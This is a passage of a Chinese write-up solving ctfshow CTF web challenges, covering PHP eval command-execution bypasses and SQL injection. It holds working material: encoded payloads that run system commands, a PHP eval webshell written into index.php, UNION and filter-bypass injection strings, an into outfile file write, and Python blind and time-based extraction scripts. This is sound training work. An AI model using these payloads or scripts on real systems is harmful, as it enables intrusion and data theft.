highlight_file(__FILE__);
if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]) &amp;&amp; isset($_GET[&#39;v3&#39;]))&#123;
    $v1 &#x3D; (String)$_GET[&#39;v1&#39;];
    $v2 &#x3D; (String)$_GET[&#39;v2&#39;];
    $v3 &#x3D; (String)$_GET[&#39;v3&#39;];

    if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123;
        if(preg_match(&#39;&#x2F;^\W+$&#x2F;&#39;, $v3))&#123;
            $code &#x3D;  eval(&quot;return $v1$v3$v2;&quot;);
            echo &quot;$v1$v3$v2 &#x3D; &quot;.$code;
        &#125;
    &#125;
&#125;</code></pre>

<p>/^\W+$/用于匹配非数字字母下划线的字符</p>
<p>这里只要求v1v2是数字就行，而在PHP中</p>
<p>数字可以和命令进行一些运算，比如<code>1-phpinfo()-1</code>输出的还是<code>phpinfo()</code><br>所以这里可以<code>1-system(&#39;tac f*&#39;)-1</code><br>构造的话或、取反或者异或都行</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220507213624723.png" alt="image-20220507213624723"></p>
<pre class="language-php" data-language="php"><code class="language-php">v1&#x3D;1&amp;v2&#x3D;2&amp;v3&#x3D;-(&quot;%13%19%13%14%05%0d&quot;^&quot;%60%60%60%60%60%60&quot;)(&quot;%03%01%14%00%06%0c%01%07%00%10%08%10&quot;^&quot;%60%60%60%20%60%60%60%60%2e%60%60%60&quot;)-
 &#x2F;&#x2F;system(&#39;cat flag.php&#39;)</code></pre>

<h2 id="web142"><a href="#web142" class="headerlink" title="web142"></a>web142</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?php
error_reporting(0);
highlight_file(__FILE__);
if(isset($_GET[&#39;v1&#39;]))&#123;
    $v1 &#x3D; (String)$_GET[&#39;v1&#39;];
    if(is_numeric($v1))&#123;
        $d &#x3D; (int)($v1 * 0x36d * 0x36d * 0x36d * 0x36d * 0x36d);
        sleep($d);
        echo file_get_contents(&quot;flag.php&quot;);
    &#125;
&#125;</code></pre>

<p>直接让v1=0或0x0</p>
<h2 id="web143"><a href="#web143" class="headerlink" title="web143"></a>web143</h2><pre class="language-php" data-language="php"><code class="language-php">error_reporting(0);
highlight_file(__FILE__);
if(isset($_GET[&#39;v1&#39;]))&#123;
    $v1 &#x3D; (String)$_GET[&#39;v1&#39;];
    if(is_numeric($v1))&#123;
        $d &#x3D; (int)($v1 * 0x36d * 0x36d * 0x36d * 0x36d * 0x36d);
        sleep($d);
        echo file_get_contents(&quot;flag.php&quot;);
    &#125;
&#125;
</code></pre>

<p>取反被过滤了，还可以用异或，减号可以用乘号替换，唯一的问题是在payload里不要有这些过滤了的字符的url编码，比如%2e</p>
<p>用%02^%2c来代表.</p>
<p>payload</p>
<pre class="language-php" data-language="php"><code class="language-php">v1&#x3D;1&amp;v2&#x3D;2&amp;v3&#x3D;*(&quot;%13%19%13%14%05%0d&quot;^&quot;%60%60%60%60%60%60&quot;)(&quot;%03%01%14%00%06%0c%01%07%02%10%08%10&quot;^&quot;%60%60%60%20%60%60%60%60%2c%60%60%60&quot;)*</code></pre>

<h2 id="web144"><a href="#web144" class="headerlink" title="web144"></a>web144</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?php

highlight_file(__FILE__);
if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]) &amp;&amp; isset($_GET[&#39;v3&#39;]))&#123;
    $v1 &#x3D; (String)$_GET[&#39;v1&#39;];
    $v2 &#x3D; (String)$_GET[&#39;v2&#39;];
    $v3 &#x3D; (String)$_GET[&#39;v3&#39;];

    if(is_numeric($v1) &amp;&amp; check($v3))&#123;
        if(preg_match(&#39;&#x2F;^\W+$&#x2F;&#39;, $v2))&#123;
            $code &#x3D;  eval(&quot;return $v1$v3$v2;&quot;);
            echo &quot;$v1$v3$v2 &#x3D; &quot;.$code;
        &#125;
    &#125;
&#125;

function check($str)&#123;
    return strlen($str)&#x3D;&#x3D;&#x3D;1?true:false;
&#125;</code></pre>

<p>v2和v3换换顺序</p>
<pre class="language-php" data-language="php"><code class="language-php">?v1&#x3D;1&amp;v3&#x3D;2&amp;v2&#x3D;-(&quot;%13%19%13%14%05%0d&quot;^&quot;%60%60%60%60%60%60&quot;)(&quot;%03%01%14%00%06%0c%01%07%00%10%08%10&quot;^&quot;%60%60%60%20%60%60%60%60%2e%60%60%60&quot;)</code></pre>

<h2 id="web145"><a href="#web145" class="headerlink" title="web145"></a>web145</h2><pre class="language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);
if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]) &amp;&amp; isset($_GET[&#39;v3&#39;]))&#123;
    $v1 &#x3D; (String)$_GET[&#39;v1&#39;];
    $v2 &#x3D; (String)$_GET[&#39;v2&#39;];
    $v3 &#x3D; (String)$_GET[&#39;v3&#39;];
    if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123;
        if(preg_match(&#39;&#x2F;[a-z]|[0-9]|\@|\!|\+|\-|\.|\_|\$|\&#125;|\%|\&amp;|\;|\&lt;|\&gt;|\*|\&#x2F;|\^|\#|\&quot;&#x2F;i&#39;, $v3))&#123;
                die(&#39;get out hacker!&#39;);
        &#125;
        else&#123;
            $code &#x3D;  eval(&quot;return $v1$v3$v2;&quot;);
            echo &quot;$v1$v3$v2 &#x3D; &quot;.$code;
        &#125;
    &#125;
&#125;
</code></pre>

<p>可以用取反，然后利用三目运算来替代过滤了的加减乘除</p>
<p>payload</p>
<pre class="language-php" data-language="php"><code class="language-php">?v1&#x3D;1&amp;v2&#x3D;2&amp;v3&#x3D;?(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%99%93%9E%98%D1%8F%97%8F):</code></pre>

<p>这里我本来想的是利用或运算的，但是发现或运算不同于异或和取反，它必须将|两边用引号引起来（不过单引号也行，当时只试了双引号</p>
<h2 id="web146"><a href="#web146" class="headerlink" title="web146"></a>web146</h2><pre class="language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);
if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]) &amp;&amp; isset($_GET[&#39;v3&#39;]))&#123;
    $v1 &#x3D; (String)$_GET[&#39;v1&#39;];
    $v2 &#x3D; (String)$_GET[&#39;v2&#39;];
    $v3 &#x3D; (String)$_GET[&#39;v3&#39;];
    if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123;
        if(preg_match(&#39;&#x2F;[a-z]|[0-9]|\@|\!|\:|\+|\-|\.|\_|\$|\&#125;|\%|\&amp;|\;|\&lt;|\&gt;|\*|\&#x2F;|\^|\#|\&quot;&#x2F;i&#39;, $v3))&#123;
                die(&#39;get out hacker!&#39;);
        &#125;
        else&#123;
            $code &#x3D;  eval(&quot;return $v1$v3$v2;&quot;);
            echo &quot;$v1$v3$v2 &#x3D; &quot;.$code;
        &#125;
    &#125;
&#125;</code></pre>

<p>:也被过滤了，三目运算符用不了了，但是可以用或符号</p>
<pre class="language-php" data-language="php"><code class="language-php">?v1&#x3D;1&amp;v2&#x3D;2&amp;v3&#x3D;|(&#39;%13%19%13%14%05%0d&#39;|&#39;%60%60%60%60%60%60&#39;)(&#39;%0c%13&#39;|&#39;%60%60&#39;)|</code></pre>

<h2 id="web147"><a href="#web147" class="headerlink" title="web147"></a>web147</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?php

highlight_file(__FILE__);

if(isset($_POST[&#39;ctf&#39;]))&#123;
    $ctfshow &#x3D; $_POST[&#39;ctf&#39;];
    if(!preg_match(&#39;&#x2F;^[a-z0-9_]*$&#x2F;isD&#39;,$ctfshow)) &#123;
        $ctfshow(&#39;&#39;,$_GET[&#39;show&#39;]);
    &#125;

&#125;</code></pre>

<p>一道creat_function构造匿名函数的rce</p>
<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/94/">https://paper.seebug.org/94/</a></p>
<p><strong>在PHP的命名空间默认为<code>\</code>，所有的函数和类都在<code>\</code>这个命名空间中，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径；而如果写\function_name() 这样调用函数，则其实是写了一个绝对路径。如果你在其他namespace里调用系统类，就必须写绝对路径这种写法。</strong></p>
<p><code>create_function</code>来完成，<code>create_function</code>的第一个参数是参数，第二个参数是内容。</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220507223054651.png" alt="image-20220507223054651"></p>
<p>所以我们可以构造payload</p>
<pre class="language-php" data-language="php"><code class="language-php">get:
return 2333;&#125;system(&#39;ls&#39;);&#x2F;&#x2F;
post:
ctf&#x3D;\create_function</code></pre>

<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220507223426477.png" alt="image-20220507223426477"></p>
<p>这个时候creat_function的结构类似</p>
<pre class="language-php" data-language="php"><code class="language-php">function a()&#123;return 2333;&#125;system(&#39;ls&#39;);&#x2F;&#x2F;&#125;</code></pre>

<p>我们的命令成功逃逸了</p>
<h2 id="web148"><a href="#web148" class="headerlink" title="web148"></a>web148</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?php

include &#39;flag.php&#39;;
if(isset($_GET[&#39;code&#39;]))&#123;
    $code&#x3D;$_GET[&#39;code&#39;];
    if(preg_match(&quot;&#x2F;[A-Za-z0-9_\%\\|\~\&#39;\,\.\:\@\&amp;\*\+\- ]+&#x2F;&quot;,$code))&#123;
        die(&quot;error&quot;);
    &#125;
    @eval($code);
&#125;
else&#123;
    highlight_file(__FILE__);
&#125;

function get_ctfshow_fl0g()&#123;
    echo file_get_contents(&quot;flag.php&quot;);
&#125;</code></pre>

<p>没过滤^可以直接异或</p>
<pre class="language-php" data-language="php"><code class="language-php">(&quot;%13%19%13%14%05%0d&quot;^&quot;%60%60%60%60%60%60&quot;)(&quot;%0c%13&quot;^&quot;%60%60&quot;);</code></pre>

<p>预期解是是使用中文</p>
<p> ?code=$哈=&quot;<code>&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;;$&#123;$哈&#125;[哼]($&#123;$哈&#125;[嗯]);&amp;哼=system&amp;嗯=tac f* </code></p>
<p><code>&quot;&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;; </code>异或出来的结果是 _GET</p>
<p>感觉多少有点抽象了</p>
<h2 id="web149"><a href="#web149" class="headerlink" title="web149"></a>web149</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?php

error_reporting(0);
highlight_file(__FILE__);

$files &#x3D; scandir(&#39;.&#x2F;&#39;); 
foreach($files as $file) &#123;
    if(is_file($file))&#123;
        if ($file !&#x3D;&#x3D; &quot;index.php&quot;) &#123;
            unlink($file);
        &#125;
    &#125;
&#125;

file_put_contents($_GET[&#39;ctf&#39;], $_POST[&#39;show&#39;]);

$files &#x3D; scandir(&#39;.&#x2F;&#39;); 
foreach($files as $file) &#123;
    if(is_file($file))&#123;
        if ($file !&#x3D;&#x3D; &quot;index.php&quot;) &#123;
            unlink($file);
        &#125;
    &#125;
&#125;</code></pre>

<p>把除了index.php的文件全删了，看起来是文件竞争</p>
<p>但是有非预期，直接利用file_put_contents往index.php里写马就行</p>
<p>payload</p>
<pre class="language-php" data-language="php"><code class="language-php">get:
ctf&#x3D;index.php
post:
show&#x3D;&lt;?php eval($_GET[1]);?&gt;</code></pre>

<p>然后访问index.php执行命令</p>
<h2 id="web150"><a href="#web150" class="headerlink" title="web150"></a>web150</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?php

&#x2F;*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-10-13 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-19 07:12:57

*&#x2F;
include(&quot;flag.php&quot;);
error_reporting(0);
highlight_file(__FILE__);

class CTFSHOW&#123;
    private $username;
    private $password;
    private $vip;
    private $secret;

    function __construct()&#123;
        $this-&gt;vip &#x3D; 0;
        $this-&gt;secret &#x3D; $flag;
    &#125;

    function __destruct()&#123;
        echo $this-&gt;secret;
    &#125;

    public function isVIP()&#123;
        return $this-&gt;vip?TRUE:FALSE;
        &#125;
    &#125;

    function __autoload($class)&#123;
        if(isset($class))&#123;
            $class();
    &#125;
&#125;

#过滤字符
$key &#x3D; $_SERVER[&#39;QUERY_STRING&#39;];
if(preg_match(&#39;&#x2F;\_| |\[|\]|\?&#x2F;&#39;, $key))&#123;
    die(&quot;error&quot;);
&#125;
$ctf &#x3D; $_POST[&#39;ctf&#39;];
extract($_GET);
if(class_exists($__CTFSHOW__))&#123;
    echo &quot;class is exists!&quot;;
&#125;

if($isVIP &amp;&amp; strrpos($ctf, &quot;:&quot;)&#x3D;&#x3D;&#x3D;FALSE)&#123;
    include($ctf);
&#125;</code></pre>

<p>利用extract变量覆盖让isVIP=1</p>
<p>日志写马</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220507225345310.png" alt="image-20220507225345310"></p>
<h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><h2 id="web171"><a href="#web171" class="headerlink" title="web171"></a>web171</h2><p>题目给了查询语句</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">$sql &#x3D; &quot;select id,username,password from ctfshow_user3 where username !&#x3D;&#39;flag&#39; and id &#x3D; &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;</code></pre>

<p>字符型注入，利用单引号闭合</p>
<p>联合注入</p>
<p>三个字段</p>
<p>查库，查表，查列名，查字段</p>
<p>payload（之后差不多的查询语句就写一个最终的payload就够了</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">-1&#39; union select database(),2,3--+ &#x2F;&#x2F;查库

-1&#39; union select group_concat(table_name),2,3 from information_schema.tables where table_schema&#x3D;&quot;ctfshow_web&quot; --+  &#x2F;&#x2F;查表

-1&#39; union select group_concat(column_name),2,3 from information_schema.columns where table_name&#x3D;&quot;ctfshow_user&quot;--+ &#x2F;&#x2F;查列名


-1&#39; union select group_concat(id,username,password),2,3 from ctfshow_user --+  &#x2F;&#x2F;最终payload</code></pre>

<h2 id="web172"><a href="#web172" class="headerlink" title="web172"></a>web172</h2><h3 id="select模块无过滤注入1"><a href="#select模块无过滤注入1" class="headerlink" title="select模块无过滤注入1"></a>select模块无过滤注入1</h3><p>//这个不就是web171吗（</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">-1&#39; union select group_concat(id,username,password),2,3 from ctfshow_user2 --+ </code></pre>

<h3 id="select模块无过滤注入2"><a href="#select模块无过滤注入2" class="headerlink" title="select模块无过滤注入2"></a>select模块无过滤注入2</h3><p>少了一列，方法还是一样的</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">-1&#39; union select group_concat(username,password),3 from ctfshow_user2 --+</code></pre>

<h2 id="web173"><a href="#web173" class="headerlink" title="web173"></a>web173</h2><p>这里除了常规的sql语句外还有个过滤，其实172的无过滤注入2就有这个过滤，就是不知道为什么还是注出来了</p>
<pre class="language-php" data-language="php"><code class="language-php">if(!preg_match(&#39;&#x2F;flag&#x2F;i&#39;, json_encode($ret)))&#123;
  $ret[&#39;msg&#39;]&#x3D;&#39;查询成功&#39;;
&#125;</code></pre>

<p>查询到的内容不能有flag这个字符串，简单一点就是不查username列，直接看password就行。或者用to_base64()来对username进行编码</p>
<p>最终payload</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">-1&#39; union select group_concat(id,to_base64(username),password),2,3 from ctfshow_user3 --+ </code></pre>



<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220509172125292.png" alt="image-20220509172125292"></p>
<h2 id="web174"><a href="#web174" class="headerlink" title="web174"></a>web174</h2><pre class="language-none"><code class="language-none">&#x2F;&#x2F;检查结果是否有flag
    if(!preg_match(&#39;&#x2F;flag|[0-9]&#x2F;i&#39;, json_encode($ret)))&#123;
      $ret[&#39;msg&#39;]&#x3D;&#39;查询成功&#39;;
    &#125;</code></pre>

<p>不光过滤了flag，还过滤了数字，盲注看起来是最好的选择了，看大部分的wp也都是盲注</p>
<pre class="language-python" data-language="python"><code class="language-python"># @Author:Y4tacker
import requests

url &#x3D; &quot;http:&#x2F;&#x2F;e076200d-5e74-4121-b2fc-04153243f7a3.chall.ctf.show&#x2F;api&#x2F;v4.php?id&#x3D;1&#39; and &quot;

result &#x3D; &#39;&#39;
i &#x3D; 0

while True:
    i &#x3D; i + 1
    head &#x3D; 32
    tail &#x3D; 127

    while head &lt; tail:
        mid &#x3D; (head + tail) &gt;&gt; 1
        payload &#x3D; f&#39;1&#x3D;if(ascii(substr((select  password from ctfshow_user4 limit 24,1),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0) -- -&#39;
        r &#x3D; requests.get(url + payload)
        if &quot;admin&quot; in r.text:
            head &#x3D; mid + 1
        else:
            tail &#x3D; mid

    if head !&#x3D; 32:
        result +&#x3D; chr(head)
    else:
        break
    print(result)</code></pre>

<pre class="language-python" data-language="python"><code class="language-python"># by macchiato
import requests
import string
flag &#x3D; &#39;&#39;
table &#x3D; string.digits + string.ascii_letters + &#39;-&#123;&#125;&#39;
for i in range(1, 45):
    for j in table:
        url &#x3D; &quot;http:&#x2F;&#x2F;dcfd2cf7-1f37-408e-a4d1-c834d09ac388.chall.ctf.show&#x2F;&#x2F;api&#x2F;v4.php?id&#x3D;&quot;
        payload &#x3D; &#39;&#39;&#39;1&#39; and substr((select password from ctfshow_user4 where username&#x3D;&quot;flag&quot;),&#123;&#125;,1)&#x3D;&quot;&#123;&#125;&quot;--+&#39;&#39;&#39;.format(i,j)
        r &#x3D; requests.get(url + payload)
        if &quot;admin&quot; in r.text:
            flag +&#x3D; j
            print(flag)
            break</code></pre>

<p>我这里就不跑了，直接贴脚本。</p>
<p>还有一种是将数字替换为字母</p>
<p>但本来的flag中一定也会有一些小写字母，这样的话就没办法分辨那个是原本的字母哪个是替换出来的。</p>
<p>所以为了避免这个问题，将password首先hex一下，因为hex()函数的返回值中字母都是大写的，所以我们返回结果中的小写字母就是原来的数字，而大写字母就是原本的字符。</p>
<p>这个虽然说比较麻烦，但也是一种很好的解题思路。</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">1&#39; union select &#39;q&#39;,(select replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(hex(password),&#39;1&#39;,&#39;q&#39;),&#39;2&#39;,&#39;w&#39;),&#39;3&#39;,&#39;e&#39;),&#39;4&#39;,&#39;r&#39;),&#39;5&#39;,&#39;t&#39;),&#39;6&#39;,&#39;y&#39;),&#39;7&#39;,&#39;u&#39;),&#39;8&#39;,&#39;i&#39;),&#39;9&#39;,&#39;o&#39;),&#39;0&#39;,&#39;p&#39;) from ctfshow_user4 where username&#x3D;&#39;flag&#39;)--+</code></pre>

<h2 id="web175"><a href="#web175" class="headerlink" title="web175"></a>web175</h2><pre class="language-php" data-language="php"><code class="language-php">&#x2F;&#x2F;检查结果是否有flag
    if(!preg_match(&#39;&#x2F;[\x00-\x7f]&#x2F;i&#39;, json_encode($ret)))&#123;
      $ret[&#39;msg&#39;]&#x3D;&#39;查询成功&#39;;
    &#125;</code></pre>

<p>把字符全ban了</p>
<p>不能通过回显来布尔盲注了，可以利用时间盲注</p>
<pre class="language-python" data-language="python"><code class="language-python">import time
import requests
url &#x3D; &#39;http:&#x2F;&#x2F;5adcc7d3-c4d3-440a-8f3e-a4b93e6b61e4.challenge.ctf.show&#x2F;api&#x2F;v5.php&#39;
flag &#x3D; &#39;&#39;
for i in range(60):
    lenth &#x3D; len(flag)
    min,max &#x3D; 32,128
    while True:
        j &#x3D; min + (max-min)&#x2F;&#x2F;2
        if(min &#x3D;&#x3D; j):
            flag +&#x3D; chr(j)
            print(flag)
            break

        payload &#x3D; f&quot;?id&#x3D;&#39; union select &#39;a&#39;,if(ascii(substr((select group_concat(password) from ctfshow_user5 where username&#x3D;&#39;flag&#39;),&#123;i&#125;,1))&lt;&#123;j&#125;,sleep(0.5),&#39;False&#39;) --+&quot;
        start_time &#x3D; time.time()
        r &#x3D; requests.get(url&#x3D;url+payload).text
        end_time &#x3D; time.time()
        sub &#x3D; end_time - start_time
        if(sub &gt;&#x3D; 0.5):
            max &#x3D; j
        else:
            min &#x3D; j</code></pre>

<p>还可以用<code>into outfile</code>和<code>dumpfile</code>来写shell</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">-1&#39; union select username,password from ctfshow_user5 where username&#x3D;&#39;flag&#39; into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.txt&#39; --+
-1&#39; union select username,password from ctfshow_user5 where username&#x3D;&#39;flag&#39; into dumpfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.txt&#39; --+</code></pre>

<h2 id="web176"><a href="#web176" class="headerlink" title="web176"></a>web176</h2><p>试了一下，是过滤了小写的select，变个大写字母就行</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">id&#x3D;-1&#39; union Select group_concat(column_name),2,3  from information_schema.columns where table_name&#x3D;&#39;ctfshow_user&#39;--+ &#x2F;&#x2F;查列


最终payload
-1&#39; union Select group_concat(id,username,password),2,3  from ctfshow_user--+ </code></pre>

<h2 id="web177"><a href="#web177" class="headerlink" title="web177"></a>web177</h2><p>过滤了空格，-，+，#，，or，空格可以用/**/绕过注释可以用#的url编码%23，or可以用||替代</p>
<p>因为没有过滤，所以直接万能密码就能出</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">-1&#39;||1%23</code></pre>

<p>正经注入的话差不多就是这样</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">-1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,password&#x2F;**&#x2F;from&#x2F;**&#x2F;ctfshow_user%23</code></pre>

<h2 id="web178"><a href="#web178" class="headerlink" title="web178"></a>web178</h2><p>我有点看不懂这个过滤了</p>
<p>为什么1‘or1%23不行1’||1%23可以，1‘or(1)%23可以，1’or(1=1)%23可以呢</p>
<p>or后边跟的一定要存在空格吗,是我记错了吗。。。</p>
<p>这个过滤了空格，*，那么用/**/当空格是不行的，但是可以用%09 %0a %0d  %0c  +之类的替代空格，或者利用括号</p>
<p>正经的注入的话</p>
<p>payload</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">-1&#39;union%09select%091,2,password%09from%09ctfshow_user%23</code></pre>

<h2 id="web179"><a href="#web179" class="headerlink" title="web179"></a>web179</h2><pre class="language-sql" data-language="sql"><code class="language-sql">1&#39;||1&#x3D;1%23</code></pre>

<p>万能密码还是可以</p>
<p>或者利用%0c代替空格</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">-1&#39;union%0cselect%0c1,2,password%0cfrom%0cctfshow_user%23</code></pre>

<p>或者空格</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">-1&#39;union(select(1),2,(password)from(ctfshow_user))%23</code></pre>

<h2 id="web180"><a href="#web180" class="headerlink" title="web180"></a>web180</h2><p>%23也被过滤了，但是%0c还能用，-也能用，所以我们可以用</p>
<p>--%0c来代替--+的空格，只要把上一题的用来注释的%23改成--%0c就行了</p>
<p>或者不要注释符让后面的单引号能够闭合</p>
<p>比如</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">-1&#39;%0cunion%0cselect&#39;1&#39;,(select%0cgroup_concat(password)from&#96;ctfshow_user&#96;),&#39;3</code></pre>

<p>或者这种</p>
<p>1111&#39;or(id=26)and&#39;a&#39;=&#39;a</p>
<p>因为sql中and优先级高于or所以就会变成</p>
<pre class="language-none"><code class="language-none">(username !&#x3D;&#39;flag&#39; and id &#x3D; &#39;11&#39;) or (id&#x3D;26and&#39;a&#39;&#x3D;&#39;a&#39;)</code></pre>



<h2 id="web181"><a href="#web181" class="headerlink" title="web181"></a>web181</h2><pre class="language-php" data-language="php"><code class="language-php">function waf($str)&#123;
  return preg_match(&#39;&#x2F; |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select&#x2F;i&#39;, $str);
&#125;</code></pre>

<p>给了waf函数的内容</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220509204736531.png" alt="image-20220509204736531"></p>
<p>不要注释直接闭合，然后利用id查出flag</p>
<p>常规的注入在这种没注释符的情况下一般都是用</p>
<p>’1’=&#39;1来替代了%23</p>
<h2 id="web182"><a href="#web182" class="headerlink" title="web182"></a>web182</h2><pre class="language-none"><code class="language-none">function waf($str)&#123;
  return preg_match(&#39;&#x2F; |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select|flag&#x2F;i&#39;, $str);
&#125;</code></pre>

<p>同样是利用or和and的优先级问题，利用id查出flag</p>
<p>1111&#39;or(id=26)and&#39;a&#39;=&#39;a</p>
<h2 id="web183"><a href="#web183" class="headerlink" title="web183"></a>web183</h2><p>改成post方式了</p>
<p>等于和select被过滤了，看起来只能利用like进行盲注了</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">tableName&#x3D;(ctfshow_user)where(pass)like&#39;ctfshow&#123;%&#39;</code></pre>

<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220509211946454.png" alt="image-20220509211946454"></p>
<p>返回为1，说明确实有这个字段，然后就是利用盲注了</p>
<p>偷一下南方师傅的脚本</p>
<pre class="language-none"><code class="language-none">#-- coding:UTF-8 --
# Author:dota_st
# Date:2021&#x2F;4&#x2F;8 21:24
# blog: www.wlhhlc.top
import requests

url &#x3D; &quot;http:&#x2F;&#x2F;adb1f64a-e1fd-4640-aeb5-b49da1a62390.challenge.ctf.show:8080&#x2F;select-waf.php&quot;
str &#x3D; &quot;0123456789abcdefghijklmnopqrstuvwxyz&#123;&#125;-&quot;
flag &#x3D; &quot;ctfshow&quot;
for i in range(0,666):
    for j in str:
        data &#x3D; &#123;&quot;tableName&quot;:&quot;(ctfshow_user)where(pass)like&#39;&#123;0&#125;%&#39;&quot;.format(flag+j)&#125;
        res &#x3D; requests.post(url&#x3D;url, data&#x3D;data)
        if &quot;$user_count &#x3D; 1&quot; in res.text:
            flag +&#x3D; j
            print(flag)
            if j&#x3D;&#x3D;&quot;&#125;&quot;:
                exit()
            break</code></pre>

<h2 id="web184"><a href="#web184" class="headerlink" title="web184"></a>web184</h2><pre class="language-php" data-language="php"><code class="language-php">function waf($str)&#123;
   return preg_match(&#39;&#x2F;\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|file|\&#x3D;|or|\x7c|select|and|flag|into|where|\x26|\&#39;|\&quot;|union|\&#96;|sleep|benchmark&#x2F;i&#39;, $str);
 &#125;</code></pre>

<p>过滤的确实有点多</p>
<p>这里连where也过滤了，可以利用right join，右连接的方式查表</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_48083470/article/details/119043137">https://blog.csdn.net/weixin_48083470/article/details/119043137</a></p>
<p>利用十六进制来绕过最后的引号，字段猜测和上个题一样在pass里</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">tableName&#x3D;ctfshow_user as a right join ctfshow_user as b on b.pass like 0x63746673686f7725</code></pre>

<p>可以看到有返回值，所以就可以上脚本跑了</p>
<p>再偷一下南方师傅的脚本</p>
<pre class="language-python" data-language="python"><code class="language-python">#-- coding:UTF-8 --
# Author:dota_st
# Date:2021&#x2F;4&#x2F;8 21:24
# blog: www.wlhhlc.top
import requests
import binascii

def to_hex(s):
    # 字符串转16进制
    str_16 &#x3D; binascii.b2a_hex(s.encode(&#39;utf-8&#39;))  
    str_16 &#x3D; bytes.decode(str_16)
    res &#x3D; str_16.replace(&quot;b&#39;&quot;,&quot;&quot;).replace(&quot;&#39;&quot;,&quot;&quot;)
    return res

url &#x3D; &quot;http:&#x2F;&#x2F;4d223a13-c7d6-4213-9c81-d388a5c26634.challenge.ctf.show:8080&#x2F;select-waf.php&quot;
str &#x3D; &quot;0123456789abcdefghijklmnopqrstuvwxyz&#123;&#125;-&quot;
flag &#x3D; &quot;ctfshow&quot;
for i in range(0,666):
    for j in str:
        result &#x3D; &quot;0x&quot; + to_hex(flag + j + &quot;%&quot;)
        data &#x3D; &#123;&quot;tableName&quot;:&quot;ctfshow_user as a right join ctfshow_user as b on b.pass like &#123;0&#125;&quot;.format(result)&#125;
        res &#x3D; requests.post(url&#x3D;url, data&#x3D;data)
        if &quot;$user_count &#x3D; 43&quot; in res.text:
            flag +&#x3D; j
            print(flag)
            if j&#x3D;&#x3D;&quot;&#125;&quot;:
                exit()
            break</code></pre>

<h2 id="web185"><a href="#web185" class="headerlink" title="web185"></a>web185</h2><pre class="language-php" data-language="php"><code class="language-php">function waf($str)&#123;
   return preg_match(&#39;&#x2F;\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|[0-9]|file|\&#x3D;|or|\x7c|select|and|flag|into|where|\x26|\&#39;|\&quot;|union|\&#96;|sleep|benchmark&#x2F;i&#39;, $str);
 &#125;</code></pre>

<p>这个waf，把数字也全ban了，那就不能用十六进制了，但是引号一样被ban了</p>
<p>放张图</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/20201127190309995.png" alt="在这里插入图片描述"></p>
<p>再偷一个南方师傅的脚本</p>
<p>这里主要是利用了mysql里true=1 true+true=2的特性，硬加true让数值等于我们要的字母的ASCII码值，然后在外面套个chr转化为字符，再利用concat进行拼接</p>
<pre class="language-none"><code class="language-none">#-- coding:UTF-8 --
# Author:dota_st
# Date:2021&#x2F;4&#x2F;8 21:24
# blog: www.wlhhlc.top
import requests

def createNum(n):
    str &#x3D; &#39;true&#39;
    if n &#x3D;&#x3D; 1:
        return &#39;true&#39;
